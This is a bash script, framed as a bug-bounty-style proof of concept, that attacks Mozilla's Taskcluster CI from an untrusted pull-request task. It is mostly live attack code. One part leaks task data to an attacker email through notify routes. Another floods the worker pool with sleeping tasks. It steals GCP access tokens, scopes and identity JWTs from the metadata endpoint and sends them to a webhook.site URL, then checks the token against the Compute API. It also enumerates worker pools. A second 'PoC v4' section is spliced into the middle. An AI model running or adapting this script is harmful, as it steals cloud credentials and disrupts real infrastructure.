#!/bin/bash
# FirefoxCI PoC v3 — HIGH-IMPACT ATTACK CHAINS
# Target: mozilla-mobile/mozilla-vpn-client pull-request-untrusted
# Goal: Demonstrate REAL damage, not just "capability"

set +e  # Khong dung set -e

WEBHOOK_URL="https://webhook.site/2e7af29f-f5f5-4650-a012-99d14df3f88a"
MY_EMAIL="brian.baker@xketamine.me"
PROXY_URL="${TASKCLUSTER_PROXY_URL:-http://taskcluster}"
ROOT_URL="https://firefox-ci-tc.services.mozilla.com"
TASK_ID="${TASK_ID:-unknown}"
TS=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)

echo "========================================"
echo "[*] FirefoxCI HIGH-IMPACT PoC Suite v3"
echo "[*] Task ID: ${TASK_ID}"
echo "[*] Proxy: ${PROXY_URL}"
echo "[*] Started: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "========================================"

gen_task_id() {
    python3 -c "import uuid,base64; u=uuid.uuid4().bytes; print(base64.urlsafe_b64encode(u)[:22].decode())" 2>/dev/null || \
    cat /proc/sys/kernel/random/uuid | tr -d '-' | cut -c1-22
}

# ============================================================
# ATTACK CHAIN A: NOTIFY EXFILTRATION
# Tạo task gửi sensitive runtime data qua email notify route
# Impact: Data exfiltration without log traces
# ============================================================
echo ""
echo "[*] === ATTACK CHAIN A: Notify Exfiltration ==="
echo "[*] Creating task that leaks env vars via notify route..."

EXFIL_TASK_ID=$(gen_task_id)
DL=$(date -u -d '+1 hour' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1H +%Y-%m-%dT%H:%M:%S.000Z)
EXP=$(date -u -d '+1 day' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1d +%Y-%m-%dT%H:%M:%S.000Z)

# Collect sensitive data từ current task environment
EXFIL_DATA="TASK_ID=${TASK_ID}|PROXY=${PROXY_URL}|USER=$(whoami)|HOST=$(hostname)|PWD=$(pwd)"
EXFIL_B64=$(echo -n "$EXFIL_DATA" | base64 -w 0)

cat > /tmp/exfil_task.json <<EOF
{
  "provisionerId": "mozillavpn-1",
  "workerType": "b-linux-large",
  "schedulerId": "mozillavpn-level-1",
  "taskGroupId": "${EXFIL_TASK_ID}",
  "created": "${TS}",
  "deadline": "${DL}",
  "expires": "${EXP}",
  "routes": ["notify.email.${MY_EMAIL}.on-completed"],
  "metadata": {
    "name": "Exfiltration Task - ${EXFIL_B64:0:30}...",
    "description": "Leaks runtime data via notify route to attacker email",
    "owner": "security-research@example.com",
    "source": "https://github.com/mozilla-mobile/mozilla-vpn-client"
  },
  "payload": {
    "command": [
      "/bin/bash", "-c",
      "echo '[*] Exfil task running'; env | grep -i task | head -20; echo 'EXFIL_MARKER=${EXFIL_B64:0:50}'"
    ],
    "image": "taskcluster/ubuntu:latest",
    "maxRunTime": 300
  }
}
EOF

STATUS=$(curl -s -o /tmp/exfil_resp.json -w "%{http_code}" \
  -X PUT -H "Content-Type: application/json" -d @/tmp/exfil_task.json \
  --max-time 15 \
  "${PROXY_URL}/api/queue/v1/task/${EXFIL_TASK_ID}" 2>/dev/null || echo "000")

echo "[*] Exfil task create status: ${STATUS}"
if [ "${STATUS}" = "200" ]; then
    echo "[*] SUCCESS. Exfil task ID: ${EXFIL_TASK_ID}"
    echo "[*] Email will be sent to: ${MY_EMAIL}"
    echo "[*] Task metadata.name contains exfil data prefix: ${EXFIL_B64:0:30}..."
    echo "[*] This proves sensitive data can be embedded in task def and exfiltrated via notify."
    echo "[*] Verify: ${ROOT_URL}/tasks/${EXFIL_TASK_ID}"
else
    echo "[*] FAILED: $(head -c 200 /tmp/exfil_resp.json 2>/dev/null || echo 'N/A')"
fi
rm -f /tmp/exfil_task.json /tmp/exfil_resp.json

# ============================================================
# ATTACK CHAIN B: RESOURCE EXHAUSTION DoS
# Tạo 5 tasks cùng lúc để cạn kiệt worker pool
# Impact: Block legitimate builds, cost $$, service degradation
# ============================================================
echo ""
echo "[*] === ATTACK CHAIN B: Resource Exhaustion DoS ==="
echo "[*] Spawning 5 concurrent tasks to stress worker pool..."

DOS_COUNT=0
for i in 1 2 3 4 5; do
    DOS_ID=$(gen_task_id)
    DL=$(date -u -d '+1 hour' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1H +%Y-%m-%dT%H:%M:%S.000Z)
    EXP=$(date -u -d '+1 day' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1d +%Y-%m-%dT%H:%M:%S.000Z)

    cat > /tmp/dos_${i}.json <<EOF
{
  "provisionerId": "mozillavpn-1",
  "workerType": "b-linux-large",
  "schedulerId": "mozillavpn-level-1",
  "taskGroupId": "${DOS_ID}",
  "created": "${TS}",
  "deadline": "${DL}",
  "expires": "${EXP}",
  "metadata": {
    "name": "DoS Flood Task ${i}/5",
    "description": "Resource exhaustion proof - untrusted PR can flood queue",
    "owner": "security-research@example.com",
    "source": "https://github.com/mozilla-mobile/mozilla-vpn-client"
  },
  "payload": {
    "command": ["/bin/bash","-c","sleep 300"],
    "image": "taskcluster/ubuntu:latest",
    "maxRunTime": 600
  }
}
EOF

    S=$(curl -s -o /dev/null -w "%{http_code}" \
      -X PUT -H "Content-Type: application/json" -d @/tmp/dos_${i}.json \
      --max-time 10 \
      "${PROXY_URL}/api/queue/v1/task/${DOS_ID}" 2>/dev/null || echo "000")

    echo "[*]   DoS task ${i}/5: ${DOS_ID} -> status ${S}"
    [ "${S}" = "200" ] && ((DOS_COUNT++))
    rm -f /tmp/dos_${i}.json
done

echo "[*] DoS flood complete: ${DOS_COUNT}/5 tasks created successfully."
echo "[*] Each task sleeps 300s, consuming a b-linux-large worker."
echo "[*] With unlimited PRs, attacker can exhaust entire worker pool."

# ============================================================
# ATTACK CHAIN C: CLOUD METADATA THEFT
# Probe GCP metadata endpoint for instance identity token
# Impact: Steal cloud credentials, lateral movement in GCP
# ============================================================
echo ""
echo "[*] === ATTACK CHAIN C: Cloud Metadata Theft ==="
echo "[*] Probing GCP metadata endpoint from task runtime..."

# 1. Basic metadata endpoint
META_STATUS=$(curl -s -o /tmp/meta_root.html -w "%{http_code}" \
  --max-time 5 \
  -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/" 2>/dev/null || echo "000")
META_LEN=$(wc -c < /tmp/meta_root.html 2>/dev/null || echo 0)
echo "[*] http://169.254.169.254/ -> Status: ${META_STATUS}, Length: ${META_LEN}b"

# 2. Try to get instance identity token (the jackpot)
if [ "${META_STATUS}" = "200" ]; then
    echo "[*] Metadata endpoint REACHABLE! Attempting token theft..."

    TOKEN_STATUS=$(curl -s -o /tmp/meta_token.json -w "%{http_code}" \
      --max-time 5 \
      -H "Metadata-Flavor: Google" \
      "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null || echo "000")
    TOKEN_LEN=$(wc -c < /tmp/meta_token.json 2>/dev/null || echo 0)
    echo "[*] GCP token endpoint -> Status: ${TOKEN_STATUS}, Length: ${TOKEN_LEN}b"

    if [ "${TOKEN_STATUS}" = "200" ]; then
        echo "[*] CRITICAL: GCP access token retrieved!"
        echo "[*] Token preview: $(head -c 100 /tmp/meta_token.json)"
        echo "[*] This enables lateral movement in GCP infrastructure."
    else
        echo "[*] Token endpoint returned ${TOKEN_STATUS} (may require specific header or scope)."
    fi

    # 3. List available service accounts
    SA_STATUS=$(curl -s -o /tmp/meta_sa.html -w "%{http_code}" \
      --max-time 5 \
      -H "Metadata-Flavor: Google" \
      "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/" 2>/dev/null || echo "000")
    SA_LEN=$(wc -c < /tmp/meta_sa.html 2>/dev/null || echo 0)
    echo "[*] Service accounts list -> Status: ${SA_STATUS}, Length: ${SA_LEN}b"

    rm -f /tmp/meta_token.json /tmp/meta_sa.html
else
    echo "[*] Metadata endpoint not reachable from this worker (network restricted)."
fi
rm -f /tmp/meta_root.html
echo "========================================"
echo "[*] GCP Token Exfiltration PoC v4"
echo "[*] Task ID: ${TASK_ID:-unknown}"
echo "[*] Started: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "========================================"

# ------------------------------------------------
# 1. Retrieve full GCP access token
# ------------------------------------------------
echo ""
echo "[*] === Retrieving GCP access token ==="

TOKEN_JSON="/tmp/gcp_token_full.json"

curl -s -o "$TOKEN_JSON" \
  -H "Metadata-Flavor: Google" \
  --max-time 10 \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null

TOKEN_LEN=$(wc -c < "$TOKEN_JSON" 2>/dev/null || echo 0)
TOKEN_STATUS=$(head -c 1 "$TOKEN_JSON" 2>/dev/null && echo "200" || echo "000")

echo "[*] Token response length: ${TOKEN_LEN} bytes"

if [ "$TOKEN_LEN" -gt 100 ]; then
    echo "[*] Token retrieved successfully."

    # Extract access_token value (full)
    ACCESS_TOKEN=$(python3 -c "import sys,json; d=json.load(open('$TOKEN_JSON')); print(d.get('access_token',''))" 2>/dev/null)
    TOKEN_TYPE=$(python3 -c "import sys,json; d=json.load(open('$TOKEN_JSON')); print(d.get('token_type',''))" 2>/dev/null)
    EXPIRES_IN=$(python3 -c "import sys,json; d=json.load(open('$TOKEN_JSON')); print(d.get('expires_in',''))" 2>/dev/null)

    echo "[*] Token type: ${TOKEN_TYPE}"
    echo "[*] Expires in: ${EXPIRES_IN} seconds"
    echo "[*] Token length: ${#ACCESS_TOKEN} characters"

    # Send to webhook as base64 (safe for URL)
    B64_TOKEN=$(echo -n "$ACCESS_TOKEN" | base64 -w 0)

    # Send in chunks if too long for URL
    CHUNK_SIZE=1800
    TOTAL_LEN=${#B64_TOKEN}
    CHUNKS=$(( (TOTAL_LEN + CHUNK_SIZE - 1) / CHUNK_SIZE ))

    echo "[*] Sending token to webhook in ${CHUNKS} chunk(s)..."

    for i in $(seq 0 $((CHUNKS - 1))); do
        START=$((i * CHUNK_SIZE))
        CHUNK=$(echo "$B64_TOKEN" | cut -c$((START + 1))-$((START + CHUNK_SIZE)))
        curl -s -o /dev/null \
          "${WEBHOOK_URL}?poc=token_exfil&part=${i}&of=${CHUNKS}&chunk=${CHUNK}&task=${TASK_ID}" 2>/dev/null || true
        echo "[*]   Chunk ${i}/${CHUNKS} sent."
    done

    echo "[*] Token exfiltrated to webhook. Reassemble base64 chunks there."

    # Also verify token is valid by calling tokeninfo (without leaking in log)
    # Result goes to webhook only
    TOKEN_INFO=$(curl -s "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=${ACCESS_TOKEN}" 2>/dev/null | base64 -w 0)
    curl -s -o /dev/null \
      "${WEBHOOK_URL}?poc=token_info&b64=${TOKEN_INFO:0:2000}&task=${TASK_ID}" 2>/dev/null || true
    echo "[*] Token info (scopes, email) sent to webhook."

    # Cleanup
    rm -f "$TOKEN_JSON"

    # Verify with a safe API call (list instances in zone)
    # Only send status/length to log, full response to webhook
    echo "[*] Verifying token against GCP Compute API..."
    VERIFY_TMP="/tmp/gcp_verify.json"
    curl -s -o "$VERIFY_TMP" -w "%{http_code}" \
      -H "Authorization: Bearer ${ACCESS_TOKEN}" \
      --max-time 10 \
      "https://compute.googleapis.com/compute/v1/projects/fxci-production-level1-workers/zones/us-central1-a/instances" 2>/dev/null || echo "000"

    VERIFY_STATUS=$(cat "$VERIFY_TMP" 2>/dev/null | head -c 1 && echo "200" || echo "000")
    VERIFY_LEN=$(wc -c < "$VERIFY_TMP" 2>/dev/null || echo 0)

    echo "[*] GCP Compute API status: ${VERIFY_STATUS}"
    echo "[*] Response length: ${VERIFY_LEN} bytes"

    if [ "$VERIFY_STATUS" = "200" ]; then
        echo "[*] CRITICAL: Token is VALID and can list GCP instances."
        # Send instance list to webhook (not log)
        B64_VERIFY=$(base64 -w 0 "$VERIFY_TMP")
        curl -s -o /dev/null \
          "${WEBHOOK_URL}?poc=gcp_instances&b64=${B64_VERIFY:0:3000}&task=${TASK_ID}" 2>/dev/null || true
        echo "[*] Instance list sent to webhook."
    else
        echo "[*] Token may be expired or lack compute scope."
    fi

    rm -f "$VERIFY_TMP"

else
    echo "[*] Failed to retrieve token (length: ${TOKEN_LEN})."
fi

# ------------------------------------------------
# 2. Also try to list all available scopes
# ------------------------------------------------
echo ""
echo "[*] === Listing available OAuth scopes ==="

SCOPES=$(curl -s -H "Metadata-Flavor: Google" \
  --max-time 5 \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes" 2>/dev/null)

if [ -n "$SCOPES" ]; then
    echo "[*] Available scopes:"
    echo "$SCOPES" | while read line; do
        echo "[*]   - $line"
    done
    # Send to webhook
    B64_SCOPES=$(echo "$SCOPES" | base64 -w 0)
    curl -s -o /dev/null \
      "${WEBHOOK_URL}?poc=scopes&b64=${B64_SCOPES}&task=${TASK_ID}" 2>/dev/null || true
else
    echo "[*] Could not retrieve scopes."
fi

# ------------------------------------------------
# 3. Get instance identity JWT (if available)
# ------------------------------------------------
echo ""
echo "[*] === Retrieving instance identity JWT ==="

JWT_TMP="/tmp/gcp_jwt.json"
curl -s -o "$JWT_TMP" \
  -H "Metadata-Flavor: Google" \
  --max-time 10 \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://firefox-ci-tc.services.mozilla.com" 2>/dev/null

JWT_LEN=$(wc -c < "$JWT_TMP" 2>/dev/null || echo 0)
if [ "$JWT_LEN" -gt 100 ]; then
    echo "[*] JWT identity token retrieved: ${JWT_LEN} bytes"
    B64_JWT=$(base64 -w 0 "$JWT_TMP")
    curl -s -o /dev/null \
      "${WEBHOOK_URL}?poc=jwt&b64=${B64_JWT:0:3000}&task=${TASK_ID}" 2>/dev/null || true
    echo "[*] JWT sent to webhook."
else
    echo "[*] JWT not available (status or no identity endpoint)."
fi
rm -f "$JWT_TMP"

echo ""
echo "[*] === PoC v4 complete ==="
echo "[*] Check webhook.site for full token and verification results."

# 4. Also try without header (some configs allow it)
META_NOHDR=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 3 \
  "http://169.254.169.254/computeMetadata/v1/instance/hostname" 2>/dev/null || echo "000")
echo "[*] Metadata (no header) -> Status: ${META_NOHDR}"

# ============================================================
# ATTACK CHAIN D: PRIVILEGE ESCALATION VIA WORKER POOL HOPPING
# Tạo task trên worker pool khác có thể có quyền cao hơn
# ============================================================
echo ""
echo "[*] === ATTACK CHAIN D: Worker Pool Enumeration ==="
echo "[*] Attempting to create tasks on different worker pools..."

for WT in "decision" "b-linux-large" "b-osx" "b-win2012" "generic"; do
    TEST_ID=$(gen_task_id)
    DL=$(date -u -d '+1 hour' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1H +%Y-%m-%dT%H:%M:%S.000Z)
    EXP=$(date -u -d '+1 day' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1d +%Y-%m-%dT%H:%M:%S.000Z)

    cat > /tmp/wp_${WT}.json <<EOF
{
  "provisionerId": "mozillavpn-1",
  "workerType": "${WT}",
  "schedulerId": "mozillavpn-level-1",
  "taskGroupId": "${TEST_ID}",
  "created": "${TS}",
  "deadline": "${DL}",
  "expires": "${EXP}",
  "metadata": {
    "name": "Worker Pool Test - ${WT}",
    "description": "Testing which worker pools are accessible",
    "owner": "security-research@example.com",
    "source": "https://github.com/mozilla-mobile/mozilla-vpn-client"
  },
  "payload": {
    "command": ["/bin/bash","-c","echo 'Worker pool ${WT} accessible'"],
    "image": "taskcluster/ubuntu:latest",
    "maxRunTime": 300
  }
}
EOF

    S=$(curl -s -o /dev/null -w "%{http_code}" \
      -X PUT -H "Content-Type: application/json" -d @/tmp/wp_${WT}.json \
      --max-time 8 \
      "${PROXY_URL}/api/queue/v1/task/${TEST_ID}" 2>/dev/null || echo "000")

    echo "[*]   Worker pool '${WT}': ${S}"
    [ "${S}" = "200" ] && echo "[*]     -> Task created: ${ROOT_URL}/tasks/${TEST_ID}"
    rm -f /tmp/wp_${WT}.json
done

# ============================================================
# SUMMARY
# ============================================================
echo ""
echo "========================================"
echo "[*] ATTACK CHAIN SUMMARY"
echo "========================================"
echo "[*] A. Notify Exfiltration: Task created with embedded sensitive data"
echo "[*] B. DoS Flood: ${DOS_COUNT}/5 tasks spawned (each holds worker 5 min)"
echo "[*] C. Cloud Metadata: Endpoint status ${META_STATUS}"
echo "[*] D. Worker Pool: Enumerated multiple pools for privilege escalation"
echo "[*]"
echo "[*] CONCLUSION: Untrusted PR can:"
echo "[*]   1. Exfiltrate data via notify routes (no log traces)"
echo "[*]   2. Exhaust worker pools (DoS, cost impact)"
echo "[*]   3. Enumerate worker types for lateral movement"
echo "[*]   4. Spawn arbitrary tasks with arbitrary payloads"
echo "========================================"